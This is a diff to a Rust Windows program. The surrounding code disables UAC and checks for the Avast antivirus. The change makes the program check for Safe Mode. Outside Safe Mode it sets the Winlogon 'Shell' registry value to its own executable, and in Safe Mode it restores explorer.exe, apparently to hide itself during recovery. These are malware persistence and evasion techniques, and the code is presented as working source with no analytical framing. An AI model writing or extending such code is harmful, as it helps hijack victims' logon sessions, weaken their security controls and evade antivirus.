@@ -6,6 +6,33 @@ use winreg::enums::*;
 use winreg::RegKey;
 use std::fs;
 use std::env;
+use std::ffi::OsString;
+
+// Updated function to check if the system is in Safe Mode
+fn is_in_safe_mode() -> bool {
+    // Run the bcdedit command and filter for "safeboot"
+    let output = Command::new("cmd")
+        .args(["/C", "bcdedit /enum {current} | findstr /i \"safeboot\""])
+        .stdout(Stdio::piped())
+        .stderr(Stdio::null())
+        .output();
+
+    match output {
+        Ok(output) => {
+            if !output.stdout.is_empty() {
+                println!("Safe Mode detected.");
+                true
+            } else {
+                println!("System is not in Safe Mode.");
+                false
+            }
+        }
+        Err(e) => {
+            eprintln!("Error checking Safe Mode status: {}", e);
+            false
+        }
+    }
+}
 
 fn disable_uac() -> io::Result<()> {
     // Open the registry key for User Account Control
@@ -135,16 +162,29 @@ fn modify_registry_avast() -> io::Result<()> {
         KEY_SET_VALUE,
     )?;
 
-    // Delete existing "Shell" value (if it exists)
-    match winlogon_key.delete_value("Shell") {
-        Ok(_) => println!("Existing Shell value deleted."),
-        Err(e) => eprintln!("Failed to delete Shell value: {}", e),
+    // If the system is in safe mode, revert changes and set "Shell" back to explorer.exe
+    if is_in_safe_mode() {
+        // Delete the existing "Shell" value if it exists
+        match winlogon_key.delete_value("Shell") {
+            Ok(_) => println!("Existing Shell value deleted (safe mode)."),
+            Err(e) => eprintln!("Failed to delete Shell value (safe mode): {}", e),
+        }
+
+        // Set the "Shell" value back to explorer.exe
+        winlogon_key.set_value("Shell", &OsString::from("explorer.exe"))?;
+        println!("Registry reverted: Shell set to explorer.exe (safe mode).");
+    } else {
+        // If not in safe mode, set the "Shell" value to the current executable path
+        // Delete the existing "Shell" value if it exists
+        match winlogon_key.delete_value("Shell") {
+            Ok(_) => println!("Existing Shell value deleted (normal mode)."),
+            Err(e) => eprintln!("Failed to delete Shell value (normal mode): {}", e),
+        }
+
+        // Convert the path to a String and set the new "Shell" value
+        winlogon_key.set_value("Shell", &current_exe_path.to_string_lossy().to_string())?;
+        println!("Registry modified: Shell set to {:?}", current_exe_path);
     }
-
-    // Convert the path to a String and set new "Shell" value to the current executable path
-    winlogon_key.set_value("Shell", &current_exe_path.to_string_lossy().to_string())?;
-
-    println!("Registry modified successfully: Shell set to {:?}", current_exe_path);
 
     Ok(())
 }
@@ -245,32 +285,6 @@ fn check_avast_installed() -> bool {
 
     // Return whether Avast service is running
     avast_service_running
-}
-
-// Updated function to check if the system is in Safe Mode
-fn is_in_safe_mode() -> bool {
-    // Run the bcdedit command and filter for "safeboot"
-    let output = Command::new("cmd")
-        .args(["/C", "bcdedit /enum {current} | findstr /i \"safeboot\""])
-        .stdout(Stdio::piped())
-        .stderr(Stdio::null())
-        .output();
-
-    match output {
-        Ok(output) => {
-            if !output.stdout.is_empty() {
-                println!("Safe Mode detected.");
-                true
-            } else {
-                println!("System is not in Safe Mode.");
-                false
-            }
-        }
-        Err(e) => {
-            eprintln!("Error checking Safe Mode status: {}", e);
-            false
-        }
-    }
 }
 
 fn main() {
